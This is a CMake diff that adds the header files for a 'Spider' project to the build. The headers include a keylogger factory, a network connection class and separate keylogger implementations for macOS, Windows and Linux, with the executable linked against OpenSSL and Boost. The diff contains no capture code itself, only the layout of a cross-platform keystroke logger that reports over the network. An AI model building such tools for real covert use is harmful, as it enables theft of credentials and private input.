@@ -19,8 +19,21 @@ endif ()
 enable_testing()
 include(CTest)
 
+include_directories(Project)
+include_directories(vendor/core/Project/core-utils/project)
+include_directories(vendor/core/Project/core-network/project)
+
+set(HEADERS_SPIDER Project/CSpiderCore.hpp Project/Configuration.hpp Project/Connection.hpp Project/KeyLogger.hpp Project/KeyLoggerFactory.hpp Project/LogHandle.hpp)
+if (APPLE)
+    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/details/OSXKeyLogger.hpp)
+elseif(WIN32)
+    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/details/WinKeyLogger.hpp)
+elseif(LINUX)
+    set(HEADERS_SPIDER ${HEADERS_SPIDER} Project/details/LinuxKeyLogger.hpp)
+endif()
+
 set(SOURCES_SPIDER Project/main.cpp)
 
-add_executable(${PROJECT_NAME} ${SOURCES_SPIDER})
+add_executable(${PROJECT_NAME} ${SOURCES_SPIDER} ${HEADERS_SPIDER})
 target_link_libraries(${PROJECT_NAME} ${Boost_LIBRARIES} ${OPENSSL_LIBRARIES} ${CMAKE_THREAD_LIBS_INIT})
 add_subdirectory(test)
